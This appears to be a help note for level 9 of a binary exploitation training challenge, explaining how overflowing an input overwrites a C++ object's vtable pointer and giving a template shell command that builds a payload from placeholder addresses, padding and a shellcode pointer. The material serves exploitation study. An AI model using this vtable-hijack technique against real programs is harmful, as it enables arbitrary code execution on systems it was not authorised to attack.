## LEVEL 9 HELP

the level9 binary make a c++ `vtable` call to an unimplemented function.

it means that the program will try to read the function address from the `vtable` pointer stored in the object instance.

then we need to overwrite the `vtable` pointer to point to a fake `vtable` that we control.

### USAGE

```bash
./level9 [input]
```

### SOLUTION
To solve this level, you can use the following python command to create the payload and run the binary:

```bash
./level9 $(python -c 'print("[VTABLE_ADDR]" + "[SHELLCODE_ADDR]" + "a" * OFFSET + "[FAKE_VTABLE_ADDR]")') 
```

### COMMAND EXPLANATION
- `[VTABLE_ADDR]` : replace this with the address of the `vtable` pointer in little endian format (you can find it using gdb or objdump)

- `[SHELLCODE_ADDR]` : replace this with the address where the shellcode will be located in little endian format

- `a * OFFSET` : padding to reach the position of the `vtable` pointer

- `[FAKE_VTABLE_ADDR]` : replace this with the address of the fake `vtable` in little endian format, which contains the address of the shellcode